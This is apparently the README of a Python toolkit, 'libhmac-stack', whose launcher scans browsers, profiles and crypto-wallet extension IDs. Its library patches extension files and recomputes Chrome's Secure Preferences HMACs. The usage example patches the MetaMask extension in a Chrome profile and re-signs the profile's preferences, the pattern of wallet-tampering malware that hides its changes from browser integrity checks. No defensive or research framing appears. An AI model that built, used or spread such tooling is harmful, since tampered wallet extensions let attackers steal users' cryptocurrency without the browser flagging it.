# libhmac-stack

Pip-installable **libhmac** library plus **launcher.py** orchestrator.

## Layout

- `src/libhmac/` — HMAC / Secure Preferences + extension vault patching
- `launcher.py` — scans browsers, profiles, wallet extension IDs; calls libhmac

## Install

```bash
cd libhmac-stack
pip install -e .
```

## Run launcher

```bash
python launcher.py
python launcher.py --username alice --skip-prefs
```

## Library usage

```python
from libhmac import PrefHashCalculator, PatchTarget, patch_extension_target, patch_profile

calc = PrefHashCalculator()
target = PatchTarget(
    browser_name="Chrome",
    browser_key="chrome",
    profile_name="Default",
    profile_path="/path/to/profile",
    extension_id="nkbihfbeogaeaoehlefnkodbefgpgknn",
    wallet_name="MetaMask",
    version_dir="/path/to/Extensions/nkbihf.../1.2.3",
)
result = patch_extension_target(target, calc)
patch_profile(target.profile_path, target.browser_key, calc)
```
